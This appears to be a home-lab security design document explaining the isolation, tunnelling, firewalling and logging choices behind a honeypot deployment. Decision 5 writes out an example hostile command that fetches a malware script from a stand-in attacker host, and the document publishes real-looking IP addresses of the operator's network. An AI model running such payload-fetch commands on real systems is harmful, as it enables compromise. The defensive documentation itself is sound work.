# 08 — Security Design Philosophy

This document explains the rationale behind every major security decision made in the honeypot deployment. Each decision is presented with its principle, the tradeoff considered, and what happens if it fails. This mirrors the format of [Project 1's security design philosophy](https://github.com/tyceerickson/home-lab-infrastructure/blob/main/docs/07-security-design-philosophy.md).

---

## Decision 1 — VPS Instead of Home Lab Exposure

**Principle:** The home network identity must never appear in attacker logs.

**Decision:** Deploy the honeypot on a DigitalOcean VPS with its own public IP, forwarding logs back to the home lab via WireGuard. Do not port-forward from the Eero router to OPNsense.

**Rationale:** If the honeypot were exposed directly from the home network (via Eero port forwarding), the home IP address (`206.174.162.81`) would appear in every attacker connection log worldwide. That IP would be indexed by Shodan, added to attack lists, and attract persistent scanning long after the honeypot was taken offline. More critically, if Cowrie had a vulnerability and an attacker escaped containment, the home network would be the blast radius.

The VPS absorbs all internet-facing risk. The home network IP never appears anywhere in the collected data. If the VPS is fully compromised, destroying it costs $6 and 30 minutes to rebuild. The home lab is completely unaffected.

**Tradeoff acknowledged:** This adds WireGuard complexity and a small monthly cost. The complexity is justified by the security isolation and provides more hands on experience.

**Failure mode:** If the VPS is compromised and an attacker pivots through the WireGuard tunnel into VLAN 10, they would reach Ubuntu Server. Mitigation: VLAN 10 firewall rules limit what Ubuntu Server can reach; the WireGuard OPT6 rule only permits traffic to `192.168.10.0/24`, not to any other VLAN.

---

## Decision 2 — WireGuard Over SSH Tunnel

**Principle:** The log forwarding channel must be encrypted, stateless, and resilient to network interruptions.

**Decision:** Use WireGuard for the VPS-to-home-lab tunnel rather than an SSH reverse tunnel or plain syslog.

**Rationale:** SSH reverse tunnels work but require keepalive configuration, are stateful, and break when the connection drops — requiring a reconnect script and error handling. Plain syslog is unencrypted, which means log data transits the internet in cleartext.

WireGuard is stateless — if the network drops and comes back, the tunnel resumes automatically without any intervention. The cryptographic authentication means no unauthorized device can inject traffic through the tunnel, even if they know the endpoint IP. OPNsense has native WireGuard support, making the home-side configuration straightforward.

**Tradeoff acknowledged:** WireGuard requires managing a keypair on both ends. The VPS public key must be updated in OPNsense whenever the VPS is rebuilt. This is a minor operational burden documented in the deployment guide.

**Failure mode:** If the VPS is rebuilt and the WireGuard keypair changes, the tunnel goes down until OPNsense is updated with the new peer public key. Mitigation: Tailscale provides an independent management path that works even when WireGuard is down.

---

## Decision 3 — VPS Initiates the Tunnel (Not OPNsense)

**Principle:** The deployment must work behind double-NAT without requiring configuration on the Eero router.

**Decision:** The VPS initiates the WireGuard connection outbound to OPNsense's WAN IP. OPNsense acts as the WireGuard server but receives connections rather than initiating them.

**Rationale:** The home WAN IP (`192.168.4.58`) is assigned by the Eero router, which sits upstream of OPNsense. The Eero NATs all traffic, meaning OPNsense's "WAN" is actually a private IP — not routable from the internet. The VPS cannot dial into `192.168.4.58` from the internet because that address doesn't exist on the public internet.

However, OPNsense can reach the VPS's public IP (`174.138.35.11`) outbound without any changes to the Eero — outbound UDP is typically unrestricted. By having the VPS listen and OPNsense dial out, the double-NAT is irrelevant.

**Tradeoff acknowledged:** This means OPNsense must have the VPS's endpoint address (`174.138.35.11:51820`) in its peer config. If the VPS IP changes (e.g., after a rebuild), OPNsense must be updated.

**What was learned:** The home WAN IP that OPNsense sees (`192.168.4.58`) is not the real public IP. The actual internet-visible IP (`206.174.162.81`) is the Eero's external address. This distinction matters for any internet-facing deployment. The WireGuard handshake confirmed the real WAN IP appears in the VPS's peer endpoint field.

---

## Decision 4 — Real SSH on Port 2222, Key-Only, Tailscale-Gated

**Principle:** Management access must be completely separated from the honeypot attack surface.

**Decision:** Move the real SSH daemon to port 2222, disable password authentication, restrict access to Tailscale IP only via Cloud Firewall, and use ed25519 key authentication.

**Rationale:** Port 22 is fully consumed by Cowrie. Any connection to port 22 goes directly to the fake shell — including management connections if the operator accidentally connects to port 22. Moving management SSH to port 2222 creates an unambiguous separation.

Restricting port 2222 to the Tailscale IP (`100.72.171.104`) means the management port is invisible to internet scanners. Even if an attacker discovers the VPS IP and tries port 2222, the DigitalOcean Cloud Firewall drops the connection before it reaches the VPS.

Key-only authentication means even if an attacker reaches port 2222 (e.g., from within the Tailscale network), they cannot brute-force their way in — no password is accepted.

**Tradeoff acknowledged:** If Tailscale is down or the Tailscale IP changes, management SSH becomes inaccessible via the normal method. Mitigation: DigitalOcean's web console provides emergency access that bypasses all SSH rules entirely.

**The SSH port fight:** During deployment, Ubuntu 24.04's socket-activated SSH (`ssh.socket`) continued binding port 22 even after `sshd_config` was modified. The fix required: `systemctl stop ssh.socket`, `systemctl disable ssh.socket`, then restart `ssh.service`. This behavior is specific to Ubuntu 24.04 and is documented in the deployment guide.

---

## Decision 5 — iptables UID-Based Outbound Block for Cowrie

**Principle:** Even if an attacker escapes the fake shell, they must not be able to make outbound connections from the VPS.

**Decision:** Add an iptables rule that drops all outbound traffic from UID 999 (the Cowrie container user).

```bash
iptables -I OUTPUT -m owner --uid-owner 999 -j DROP
```

**Rationale:** Cowrie runs as UID 999 inside the Docker container. If an attacker identifies the fake shell and attempts to pivot — for example, by running `wget http://attacker-c2/real-malware.sh` — the iptables rule drops the outbound connection before it leaves the VPS. The attacker cannot download tools, cannot phone home, and cannot use the VPS as a pivot point.

This is defense-in-depth operating below the Docker layer. Docker networking and the DigitalOcean Cloud Firewall both restrict inbound traffic, but this rule restricts outbound from a specific UID — something neither Docker nor the cloud firewall can do.

**Tradeoff acknowledged:** This rule blocks Cowrie from making any outbound connections. Cowrie itself does not need to initiate outbound connections for normal operation (logging, listening), so this has no operational impact on the honeypot.

**Failure mode:** If an attacker escapes the Docker container and runs as a different UID, this rule doesn't apply. However, escaping Docker itself would require a kernel exploit, which is beyond the scope of automated scanning tools.

---

## Decision 6 — Three Honeypot Services vs. One

**Principle:** The dataset must represent multiple attack categories for the AI classifier in Project 4 to have meaningful feature diversity.

**Decision:** Run Cowrie (SSH/Telnet), nginx (HTTP/HTTPS), and Dionaea (SMB/FTP/DB) simultaneously rather than just Cowrie.

**Rationale:** A dataset containing only SSH brute force data trains a classifier that can only detect SSH brute force. The Project 4 AI pipeline needs training data that covers multiple attack types and protocols. Each additional service adds:
- A new MITRE ATT&CK technique category
- A new attacker population (web scanners are different people with different tools than SSH scanners)
- A new data format that tests the SIEM's parsing flexibility

The combined resource footprint is low enough for the VPS to handle comfortably (Cowrie 70MB + nginx 7MB + Dionaea 30MB = ~107MB total container RAM).

**Tradeoff acknowledged:** Three services means three different log formats and three different analysis pipelines. This adds complexity to the data processing stage. The tradeoff is accepted because the data diversity benefit outweighs the parsing complexity.

---

## Decision 7 — GeoIP Enrichment at the Ubuntu Server Layer

**Principle:** Log enrichment should happen close to the data storage layer, not on the VPS.

**Decision:** GeoIP enrichment runs on Ubuntu Server via hourly cron, not on the VPS.

**Rationale:** Running the enrichment on the VPS would require installing Python dependencies and MaxMind databases (75MB) on a resource-constrained 1GB Droplet that is already running three Docker containers. More importantly, the enrichment script doesn't need to be on the VPS — it only needs access to the log files, which land on Ubuntu Server via rsync.

Keeping the VPS lean reduces attack surface. The VPS runs: Docker, WireGuard, rsync, fail2ban, Tailscale. Nothing else. Every additional package on an internet-exposed host is a potential vulnerability surface.

**Tradeoff acknowledged:** There is up to a 15-minute lag between a log event and its GeoIP enrichment (rsync interval) plus up to 60 minutes before enrichment runs (hourly cron). For a retrospective analysis this is entirely acceptable. Real-time enrichment would require a streaming pipeline, which is Project 4 scope.

---

## Decision 8 — Cowrie Volume Mount Path

**Principle:** Log data must persist on the host filesystem, not only inside the container.

**Decision:** Mount the Cowrie log path as `./logs:/cowrie/cowrie-git/var/log/cowrie` in docker-compose.yml.

**Rationale:** The correct internal Cowrie log path is `/cowrie/cowrie-git/var/log/cowrie`, not the commonly documented `/cowrie/var/log/cowrie`. The correct path was identified by examining the running container's file structure. Using the wrong path results in logs being written inside the container with no host-side visibility — the container must be queried directly for logs, and they are lost on container rebuild.

This was a non-obvious deployment issue. The volume mount path depends on how the specific Docker image was built, not on Cowrie's default configuration. It is documented here explicitly because it would cause a silent failure (no logs on host) that is easy to miss.

**Verification:** After deployment, `ls /opt/cowrie/logs/` on the VPS host should show `cowrie.json` within 5 minutes of the first connection. An empty directory after connections are confirmed (via `docker logs cowrie`) indicates a wrong volume path.

---

## Design Tension: Operational Security vs. Documentation

One deliberate tension in this project: the deployment guide documents real IP addresses, real credentials patterns, and real configuration details. This is intentional — the portfolio value of this project comes from demonstrating real operational security understanding, not from generic examples.

All sensitive values (private keys, license keys) are either redacted (`<REDACTED>`) or have been rotated since documentation was written. The VPS is a disposable asset designed to be rebuilt. The home network architecture described is the real architecture — documenting it accurately is more professionally valuable than obscuring it.

The risk model: anyone who reads this documentation and the home lab documentation knows the VLAN structure and IP addressing of a private home lab. That information has no operational value to an attacker without physical or network access to the lab. The educational and portfolio value of accurate documentation far outweighs this theoretical risk.
